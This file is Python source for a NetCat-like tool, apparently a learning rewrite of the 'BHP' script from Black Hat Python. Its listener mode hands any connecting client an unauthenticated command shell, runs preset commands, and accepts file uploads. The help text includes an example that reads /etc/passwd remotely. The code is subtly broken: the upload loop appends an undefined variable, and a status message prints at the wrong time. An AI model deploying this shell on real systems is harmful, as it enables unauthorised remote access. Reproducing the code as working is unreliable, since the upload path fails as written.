
This code is a Python-based NetCat-like tool that allows for network communication, command execution, and file transfers.
The script is useful for penetration testing, reverse shell scenarios, or simple remote administration.
 It mimics the functionality of the original NetCat tool but is implemented in Python.

'''

import argparse     # Used to create a command-line interface (CLI)
import socket       # Provides network socket programming capabilities
import shlex        # Helps safely split command-line input into tokens
import subprocess   # Allows running system commands and capturing output
import sys          # Provides system-specific functions (e.g., exit)
import textwrap     # Formats help messages in argparse
import threading    # Enables handling multiple connections via multithreading


def execute(cmd):
    cmd=cmd.strip()
    if not cmd :
        return
    output=subprocess.check_output(shlex.split(cmd),stderr=subprocess.STDOUT)       #run command on the local operating system
    return output.decode()

class NetCat:
    def __init__(self, args, buffer=None):          #It's called the constructor or initializer
        self.args=args
        self.buffer=buffer
        self.socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)        #create a socket object 
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)   #This line is telling the socket to allow reusing the network address (IP and port) quickly after the program is closed.
    def run(self):
        if self.args.listen:        #if we setting up as a listener 
            self.listen()
        else :
            self.send()

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:                                             #if theire is data in buffer send to it the listener 
            self.socket.send(self.buffer)
        try :
            while True:
                recv_len =1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len=len(data)
                    response += data.decode()
                    if recv_len < 4096 :
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    if buffer:
                        buffer += '\n'
                        self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print("User terminated")
            self.socket.close()
            sys.exit()

    def listen(self):       #when program run as a listener
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(1)
        while True:
            client_socket, _=self.socket.accept()
            print('[*] Listening on %s:%d' %(self.args.target,self.args.port))              # show connected client or attacker
            client_thread =threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()
    

    def handle(self, client_socket):        #logic to perform file upload,execute commands,and create interactive shell
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        elif self.args.upload:
            file_buffer=b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += buffer
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file{self.args.upload}'
            client_socket.send(message.encode())

        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP:#>')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute (cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer= b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

    




if __name__=='__main__':
    parser = argparse.ArgumentParser(description='BHP net Tool',formatter_class=argparse.RawDescriptionHelpFormatter,epilog=textwrap.dedent('''Example:
            netcat.py -t 192.168.1.108  -p 5555 -l -c # command shell                           
            netcat.py -t 192.168.1.108  -p 5555 -l -u mytext.txt # upload to file
            netcat.py -t 192.168.1.108  -p 5555 -l -e=\"cat/etc/passwd\" # execute command
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
            netcat.py -t 192.168.1.108  -p 5555 # connect to server'''))                            # epilog usages the program will display when user invoke with --help
    parser.add_argument('-c', '--command', action='store_true', help='command shell')               # add six argument that specify how we want to program behaviour
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help=' specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload')
    args = parser.parse_args()
    if args.listen:
        buffer=''
    else:
        buffer=sys.stdin.read()             #read the input providing by user in command line
    nc =NetCat(args, buffer.encode())       #here send to netcat class input in byte formate
    nc.run()                                # execute run() method of NetCat class
